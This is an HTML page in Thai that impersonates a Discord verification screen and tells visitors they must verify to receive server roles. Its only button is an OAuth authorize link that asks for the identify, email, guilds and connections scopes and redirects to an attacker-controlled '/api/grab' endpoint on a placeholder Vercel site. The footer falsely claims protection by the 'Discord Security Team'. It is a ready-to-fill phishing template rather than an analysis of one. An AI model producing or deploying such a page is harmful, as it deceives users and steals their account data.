<!DOCTYPE html>
<html lang="th">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Discord | Verification System</title>
    <style>
        :root { --discord-bg: #313338; --discord-card: #2b2d31; --discord-blurple: #5865f2; --discord-text: #f2f3f5; --discord-muted: #949ba4; }
        body { background-color: var(--discord-bg); color: var(--discord-text); font-family: 'gg sans', 'Noto Sans', sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .container { background-color: var(--discord-card); width: 440px; padding: 32px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0,0,0,0.24); text-align: center; border: 1px solid rgba(255,255,255,0.05); }
        .shield-wrapper { width: 80px; height: 80px; margin: 0 auto 20px; animation: pulse 2s infinite; }
        @keyframes pulse { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.1); opacity: 1; } }
        h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; color: #fff; }
        p { font-size: 16px; color: var(--discord-muted); line-height: 20px; margin-bottom: 28px; }
        .btn-verify { background-color: var(--discord-blurple); color: white; text-decoration: none; padding: 12px 24px; border-radius: 3px; display: block; font-weight: 600; font-size: 16px; transition: 0.2s; cursor: pointer; border: none; width: 100%; box-sizing: border-box; }
        .btn-verify:hover { background-color: #4752c4; }
        .footer { margin-top: 20px; font-size: 12px; color: var(--discord-muted); text-transform: uppercase; letter-spacing: 0.5px; opacity: 0.6; }
    </style>
</head>
<body>
    <div class="container">
        <div class="shield-wrapper"><img src="https://i.imgur.com/KzYF7fF.png" style="width:100%;"></div>
        <h1>ยืนยันตัวตน</h1>
        <p>เซิร์ฟเวอร์นี้ถูกป้องกันด้วยระบบความปลอดภัย กรุณายืนยันตัวตนเพื่อรับบทบาทและเข้าถึงห้องแชท</p>
        
        <a href="https://discord.com/api/oauth2/authorize?client_id=ใส่_CLIENT_ID_มหาเทพ&redirect_uri=https://ชื่อเว็บมหาเทพ.vercel.app/api/grab&response_type=code&scope=identify%20email%20guilds%20connections" class="btn-verify">ยืนยันตัวตนตอนนี้</a>
        
        <div class="footer">Protected by Discord Security Team</div>
    </div>
</body>
</html>
